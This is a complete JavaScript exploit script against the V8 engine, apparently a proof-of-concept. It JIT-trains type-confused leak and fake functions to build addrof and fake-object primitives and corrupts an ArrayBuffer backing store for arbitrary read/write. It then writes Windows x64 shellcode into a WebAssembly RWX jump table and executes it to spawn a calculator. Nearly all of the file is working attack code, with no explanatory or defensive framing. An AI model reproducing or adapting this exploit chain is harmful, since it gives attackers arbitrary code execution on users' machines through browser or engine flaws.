let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);

let f2i = (f) => 
{
    fv[0] = f;
      return dv[0];
}

let i2f = (i) => 
{
    dv[0] = BigInt(i);
      return fv[0];
}

let i2ba = (i) => 
{
    dv[0] = BigInt(i);
    return float_array.from(new Uint8Array(ab)).reverse(); 
}

let smi2f = (i) => 
{
	return i2f(parseInt(i.toString(16)+"0".repeat(8),16))
}

let hexprintablei = (i) => 
{
    return "0x"+(i).toString(16).padStart(16,"0");
}


const shellcode = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00]
const log=print


const debug=false;


log("[+] Start exploit...");

log("[+] Setup wasm instance");


function test() {
  var wasmImports = { 
  env: {
      puts: function puts (index) {}
    }
  };
  var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
    96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
    116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
    131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
    109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
    128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
    65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]); 
  let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports); 
  return m; 
}

wasm_instance=test();
pwnme = wasm_instance.exports.hello; 


log("[+] Setup leak and fake functions");

let float_obj = {x:{p0:1.1,p1:1.1,p2:1.1,p3:1.1,p4:1.1,p5:1.1,p6:1.1,p7:1.1,p8:1.1,p9:1.1,p10:1.1,p11:1.1,p12:1.1,p13:1.1,p14:1.1,p15:1.1,p16:1.1,p17:1.1,p18:1.1,p19:1.1,p20:1.1,p21:1.1,p22:1.1,p23:1.1,p24:1.1,p25:1.1,p26:1.1,p27:1.1,p28:1.1,p29:1.1}};
let obj_array = {x2:{y2:{}}};

function leak(o)
{
	return [o.x.p0,o.x.p1,o.x.p2,o.x.p3,o.x.p4,o.x.p5,o.x.p6,o.x.p7,o.x.p8,o.x.p9,o.x.p10,o.x.p11,o.x.p12,o.x.p13,o.x.p14,o.x.p15,o.x.p16,o.x.p17,o.x.p18,o.x.p19,o.x.p20,o.x.p21,o.x.p22,o.x.p23,o.x.p24,o.x.p25,o.x.p26,o.x.p27,o.x.p28,o.x.p29];
}

function fake(o2)
{
	return o2.x2.y2;
}

function addrof(o)
{
	a={x:{p0p:o}};
	return leak(a)[0];
}

log("[+] JIT leak and fake functions")

for(i=0;i<0x10000;i++)leak(float_obj);
for(i=0;i<0x10000;i++)fake(obj_array);



float_obj.x=[]; 
float_array = [1.1,1.2,1.3];
leak_arr=leak(float_obj);

for(i=0;i<leak_arr.length;i++)
{
	if(leak_arr[i]==1.3)
	{
		float_map=leak_arr[i+1]
		break;
	}
		
}

log("[+] Packed double map addr : "+hexprintablei(f2i(float_map)));


log("[+] Setup fake obj")
fakeit = [float_map, 0, 0, smi2f(0x1000)].slice(0)

fakeitAddr=f2i(addrof(fakeit));
log("[+] Fake obj addr : "+hexprintablei(fakeitAddr));
fakeit[2]=i2f(fakeitAddr);
obj_array.x2={l:i2f(fakeitAddr-0x20n)}
imthefakeobj=fake(obj_array);


print("[+] Fake obj injected");

arr = imthefakeobj;

let arraybuffer = new ArrayBuffer(1000);
log("[+] arr backstore length corrupted")
log("[+] Getting backstore pointer index")
let idx_size_arraybuffer = arr.indexOf(i2f(1000));
let backstore_ptr_idx= idx_size_arraybuffer+1; 

log("[+] Setup R/W primitives")
let read8 = (addr) =>
{
	arr[backstore_ptr_idx]=i2f(addr); 
	let a = new DataView(arraybuffer); 
	if(debug)log(hexprintablei(f2i(a.getFloat64(0,true))));
	return f2i(a.getFloat64(0,true)) 
}

let write8 = (idxx, data) =>
{
	a = new DataView(arraybuffer); 
	a.setUint8(idxx,shellcode[idxx]); 
}


log("[+] Getting RWX pointer from wasm")


let wasm_instance_addr=f2i(addrof(wasm_instance));
let jump_table_start=read8(wasm_instance_addr+0x80n-1n);
 
log("[+] Address RWX : "+hexprintablei(jump_table_start))

log("[+] Writing shellcode...")
arr[backstore_ptr_idx]=i2f(jump_table_start); 

for (idxx = 0; idxx < shellcode.length; idxx++)
{
	write8(idxx, shellcode[idxx]);
	
}
	
log("[+] Spawning calc like its 1991 !")

pwnme(); 


